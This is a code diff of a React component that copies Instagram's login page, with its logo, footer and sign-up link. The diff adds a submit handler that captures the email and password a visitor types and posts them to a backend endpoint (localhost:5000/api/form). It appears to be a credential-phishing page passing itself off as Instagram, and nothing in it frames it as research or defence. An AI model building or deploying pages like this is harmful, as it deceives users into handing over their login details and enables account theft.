@@ -1,19 +1,40 @@
 import React, { useState } from "react";
-import "../Css/instalogin.css"
+import "../Css/instalogin.css";
 import { Link } from "react-router-dom";
+import axios from "axios";
 
 const IgPage = () => {
   const [language, setLanguage] = useState("English");
+  const [formData, setFormData] = useState({ email: "", password: "" });
+  const [response, setResponse] = useState("");
 
   const handleLanguageChange = (event) => {
     setLanguage(event.target.value);
   };
 
+  const handleChange = (e) => {
+    setFormData({ ...formData, [e.target.name]: e.target.value });
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+    console.log("Submitting form with data:", formData);
+    try {
+      const res = await axios.post("http://localhost:5000/api/form", formData, {
+        headers: { "Content-Type": "application/json" },
+      });
+      console.log("Response received:", res.data);
+      setResponse(res.data.message);
+      setFormData({ email: "", password: "" });
+    } catch (error) {
+      console.error("Error submitting form:", error);
+      setResponse("Error submitting the form");
+    }
+  };
+
   return (
     <div>
-      {/* Announcement Section */}
       <section className="section-all">
-        {/* Main Content */}
         <main className="main" role="main">
           <div className="wrapper">
             <article className="article">
@@ -26,57 +47,50 @@ const IgPage = () => {
                       alt="Instagram"
                     />
                   </div>
-                  {/* Header End */}
-
                   <div className="form-wrap">
-                    <form className="form">
+                    <form className="form" onSubmit={handleSubmit}>
                       <div className="input-box">
                         <input
-                          type="text"
-                          id="name"
-                          placeholder="Phone number, username, or email"
+                          type="email"
+                          name="email"
+                          placeholder="Email"
                           maxLength="30"
-                          autoComplete="off"
-                          name="username"
+                          autoComplete="on"
                           required
+                          value={formData.email}
+                          onChange={handleChange}
                         />
                       </div>
-
                       <div className="input-box">
                         <input
                           type="password"
                           name="password"
-                          id="password"
                           placeholder="Password"
                           maxLength="30"
-                          autoComplete="off"
+                          autoComplete="on"
                           required
+                          value={formData.password}
+                          onChange={handleChange}
                         />
                       </div>
-
                       <span className="button-box">
-                        <button className="btn" type="submit" name="submit">
+                        <button className="btn" type="submit">
                           Log in
                         </button>
                       </span>
-
                       <a className="forgot" href="#">
                         Forgot password?
                       </a>
                     </form>
+                    {response && <p className="response-message">{response}</p>}
                   </div>
-                  {/* Form-wrap End */}
                 </div>
-                {/* Login-box End */}
-
                 <div className="login-box">
                   <p className="text">
                     Don't have an account?
                     <Link to="/instagramsignup"> Sign up</Link>
                   </p>
                 </div>
-                {/* Signup-box End */}
-
                 <div className="app">
                   <p>Get the app.</p>
                   <div className="app-img">
@@ -93,17 +107,11 @@ const IgPage = () => {
                       />
                     </a>
                   </div>
-                  {/* App-img End */}
                 </div>
-                {/* App End */}
               </div>
-              {/* Content End */}
             </article>
           </div>
-          {/* Wrapper End */}
         </main>
-
-        {/* Footer */}
         <footer className="footer" role="contentinfo">
           <div className="footer-container">
             <nav className="footer-nav" role="navigation">
@@ -151,10 +159,8 @@ const IgPage = () => {
                 </li>
               </ul>
             </nav>
-
             <span className="footer-logo">&copy; 2025 Instagram</span>
           </div>
-          {/* Footer-container End */}
         </footer>
       </section>
     </div>
